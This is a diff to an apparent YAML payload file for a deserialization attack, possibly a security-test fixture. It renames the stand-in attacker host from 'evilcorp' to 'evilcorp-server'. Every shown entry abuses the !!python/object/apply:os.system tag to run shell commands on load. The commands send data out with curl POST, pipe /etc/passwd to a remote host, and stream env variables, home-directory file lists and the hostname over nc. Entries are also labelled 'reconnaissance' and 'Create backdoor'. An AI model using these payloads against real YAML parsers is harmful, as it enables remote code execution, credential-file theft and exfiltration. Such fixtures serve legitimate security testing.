@@ -45,15 +45,15 @@ system_command: !!python/object/apply:os.system
 
 # Attack 2: Data exfiltration via HTTP 
 http_exfiltration: !!python/object/apply:os.system
-  - "curl -X POST http://evilcorp:8888/yaml_attack --data 'source=yaml_config&attack=http_exfil'"
+  - "curl -X POST http://evilcorp-server:8888/yaml_attack --data 'source=yaml_config&attack=http_exfil'"
 
 # Attack 3: File system access and exfiltration
 passwd_theft: !!python/object/apply:os.system  
-  - "cat /etc/passwd | curl -X POST http://evilcorp:8888/sensitive_data --data-binary @-"
+  - "cat /etc/passwd | curl -X POST http://evilcorp-server:8888/sensitive_data --data-binary @-"
 
 # Attack 4: Netcat reverse connection
 netcat_callback: !!python/object/apply:os.system
-  - "echo 'YAML reverse shell attempt' | nc evilcorp 5555"
+  - "echo 'YAML reverse shell attempt' | nc evilcorp-server 5555"
 
 # Attack 5: System reconnaissance 
 system_recon: !!python/object/apply:os.system
@@ -61,15 +61,15 @@ system_recon: !!python/object/apply:os.system
 
 # Attack 6: Environment variable extraction
 env_extract: !!python/object/apply:os.system
-  - "env | grep -E '(USER|HOME|PATH)' | nc evilcorp 5555"
+  - "env | grep -E '(USER|HOME|PATH)' | nc evilcorp-server 5555"
 
 # Attack 7: File listing and exfiltration
 file_listing: !!python/object/apply:os.system
-  - "find /home -maxdepth 2 -type f -name '*.txt' 2>/dev/null | head -10 | nc evilcorp 5555"
+  - "find /home -maxdepth 2 -type f -name '*.txt' 2>/dev/null | head -10 | nc evilcorp-server 5555"
 
 # Attack 8: Hostname theft
 hostname_theft: !!python/object/apply:os.system
-  - "hostname | nc evilcorp 5555"
+  - "hostname | nc evilcorp-server 5555"
 
 # Attack 9: Create backdoor
 backdoor_creation: !!python/object/apply:os.system
